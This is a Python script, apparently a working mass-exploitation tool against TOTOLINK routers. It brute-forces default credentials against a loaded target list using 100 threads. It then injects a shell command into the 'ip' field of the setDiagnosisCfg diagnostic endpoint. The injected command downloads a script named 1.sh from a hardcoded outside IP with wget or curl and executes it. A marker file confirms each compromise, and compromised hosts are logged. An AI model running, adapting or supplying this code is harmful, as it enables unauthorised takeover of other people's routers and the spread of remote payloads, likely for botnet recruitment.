#!/usr/bin/env python3
"""
TOTOLINK VERIFIED EXPLOITER
Only reports success if command actually executes (verified exploitation)
"""

import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import sys
import logging
from typing import List, Optional, Tuple
import json
import hashlib
import random

requests.packages.urllib3.disable_warnings()
logging.getLogger("urllib3").setLevel(logging.CRITICAL)
logging.getLogger("requests").setLevel(logging.CRITICAL)

# ============================================================================
# CONFIGURATION
# ============================================================================

CONFIG = {
    'timeout': 8,
    'max_workers': 100,  # Reduced for verification
    'payload_server': '72.62.37.166',
    'input_file': 'totolink.txt',
    'output_file': 'verified_exploited_totolink.txt',
}

CREDENTIALS = [
    ('admin', 'admin'),
    ('root', 'root'),
    ('admin', 'password'),
]

# ============================================================================
# TOTOLINK VERIFIED EXPLOITER
# ============================================================================

class VerifiedTotolinkExploiter:
    """TOTOLINK exploiter with actual verification."""
    
    def __init__(self):
        self.exploited = []
        self.lock = __import__('threading').Lock()
        self.count = 0
    
    def parse_target(self, target: str) -> Tuple[str, int]:
        """Parse IP:port format."""
        if ':' in target:
            ip, port = target.rsplit(':', 1)
            try:
                port = int(port)
            except:
                port = 80
        else:
            ip = target
            port = 80
        
        return ip, port
    
    def attempt_login(self, ip: str, port: int, username: str, password: str) -> Optional[str]:
        """Attempt to login and get SESSION_ID."""
        base_url = f'http://{ip}:{port}'
        
        try:
            # Step 1: Initial login
            url_login = f'{base_url}/cgi-bin/cstecgi.cgi?action=login'
            headers_login = {
                'Host': f'{ip}:{port}',
                'User-Agent': 'Mozilla/5.0',
                'Connection': 'close'
            }
            
            payload_login = {'username': username, 'password': password}
            
            resp_login = requests.post(
                url_login,
                headers=headers_login,
                data=payload_login,
                allow_redirects=False,
                timeout=CONFIG['timeout'],
                verify=False
            )
            
            # Step 2: Get SESSION_ID
            url_auth = f'{base_url}/formLoginAuth.htm'
            headers_auth = {
                'Host': f'{ip}:{port}',
                'User-Agent': 'Mozilla/5.0',
                'Referer': f'{base_url}/login.html',
                'Connection': 'close'
            }
            
            params_auth = {
                'authCode': '1',
                'userName': username,
                'goURL': 'home.html',
                'action': 'login'
            }
            
            resp_auth = requests.get(
                url_auth,
                headers=headers_auth,
                params=params_auth,
                allow_redirects=False,
                timeout=CONFIG['timeout'],
                verify=False
            )
            
            cookie_header = resp_auth.headers.get('Set-Cookie', '')
            if 'SESSION_ID=' in cookie_header:
                session_id = cookie_header.split('SESSION_ID=')[1].split(';')[0]
                return session_id
        
        except:
            pass
        
        return None
    
    def verify_command_execution(self, ip: str, port: int, session_id: str, marker: str) -> bool:
        """Verify if command actually executed by checking for marker file."""
        base_url = f'http://{ip}:{port}'
        
        try:
            # Try to access a file that would be created if command executed
            # TOTOLINK typically has web root at /home/web/
            check_urls = [
                f'{base_url}/marker_{marker}.txt',
                f'{base_url}/tmp/marker_{marker}.txt',
            ]
            
            for check_url in check_urls:
                try:
                    resp = requests.get(check_url, timeout=3, verify=False)
                    if resp.status_code == 200 and marker in resp.text:
                        return True
                except:
                    pass
            
            return False
        except:
            return False
    
    def send_exploit(self, ip: str, port: int, session_id: str) -> bool:
        """Send exploit with marker for verification."""
        base_url = f'http://{ip}:{port}'
        
        # Generate unique marker
        marker = hashlib.md5(f"{ip}{port}{time.time()}".encode()).hexdigest()[:8]
        
        # Payload that creates a marker file to verify execution
        payload = (
            f"--c;$("
            f"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; "
            f"echo {marker} > marker_{marker}.txt; "
            f"wget http://{CONFIG['payload_server']}/1.sh -O 1.sh 2>/dev/null || "
            f"curl -s -o 1.sh http://{CONFIG['payload_server']}/1.sh 2>/dev/null; "
            f"chmod +x 1.sh; "
            f"./1.sh 2>/dev/null"
            f")"
        )
        
        try:
            url_final = f'{base_url}/cgi-bin/cstecgi.cgi'
            headers_final = {
                'Host': f'{ip}:{port}',
                'X-Requested-With': 'XMLHttpRequest',
                'User-Agent': 'Mozilla/5.0',
                'Content-Type': 'application/json',
                'Cookie': f'SESSION_ID={session_id}',
                'Connection': 'close'
            }
            
            payload_json = {
                'ip': payload,
                'num': '3',
                'topicurl': 'setDiagnosisCfg'
            }
            
            resp_final = requests.post(
                url_final,
                headers=headers_final,
                json=payload_json,
                timeout=CONFIG['timeout'],
                verify=False
            )
            
            if resp_final.status_code == 200:
                # Wait a moment for command to execute
                time.sleep(1)
                
                # Verify execution
                if self.verify_command_execution(ip, port, session_id, marker):
                    return True
        
        except:
            pass
        
        return False
    
    def exploit(self, target: str) -> bool:
        """Exploit target with verification."""
        ip, port = self.parse_target(target)
        
        for username, password in CREDENTIALS:
            session_id = self.attempt_login(ip, port, username, password)
            
            if not session_id:
                continue
            
            print(f"[*] {target} - Logged in as {username}:{password}, testing exploit...")
            
            if self.send_exploit(ip, port, session_id):
                with self.lock:
                    self.exploited.append(target)
                    self.count += 1
                
                print(f"[★] VERIFIED EXPLOITED: {target}")
                
                with open(CONFIG['output_file'], 'a') as f:
                    f.write(f"{target}\n")
                
                return True
        
        return False
    
    def run(self, targets: List[str]):
        """Run exploitation with verification."""
        print(f"\n{'='*80}")
        print(f"TOTOLINK VERIFIED EXPLOITER")
        print(f"{'='*80}\n")
        print(f"[*] Targets: {len(targets)}")
        print(f"[*] Only reports CONFIRMED successful exploits")
        print(f"[*] Workers: {CONFIG['max_workers']}\n")
        
        start = time.time()
        
        with ThreadPoolExecutor(max_workers=CONFIG['max_workers']) as executor:
            futures = [executor.submit(self.exploit, t) for t in targets]
            
            completed = 0
            for future in as_completed(futures):
                completed += 1
                try:
                    future.result()
                except:
                    pass
                
                if completed % 20 == 0:
                    elapsed = time.time() - start
                    rate = completed / elapsed if elapsed > 0 else 0
                    pct = (completed / len(targets)) * 100
                    print(f"[=] {pct:.0f}% | {completed}/{len(targets)} | Rate: {rate:.0f}/s | Verified: {self.count}\n")
        
        elapsed = time.time() - start
        
        print(f"\n{'='*80}")
        print(f"[★] VERIFIED EXPLOITS: {self.count}")
        print(f"Time: {elapsed:.1f}s")
        print(f"Rate: {len(targets)/elapsed:.0f} targets/s")
        print(f"Results: {CONFIG['output_file']}")
        print(f"{'='*80}\n")

# ============================================================================
# MAIN
# ============================================================================

def load_targets(filename: str) -> List[str]:
    """Load targets from file."""
    try:
        with open(filename, 'r') as f:
            targets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        return targets
    except:
        print(f"[!] Error reading {filename}")
        sys.exit(1)

def main():
    """Main entry point."""
    targets = load_targets(CONFIG['input_file'])
    
    if not targets:
        print("[!] No targets loaded")
        return
    
    print(f"[*] Loaded {len(targets)} targets\n")
    
    exploiter = VerifiedTotolinkExploiter()
    exploiter.run(targets)

if __name__ == "__main__":
    main()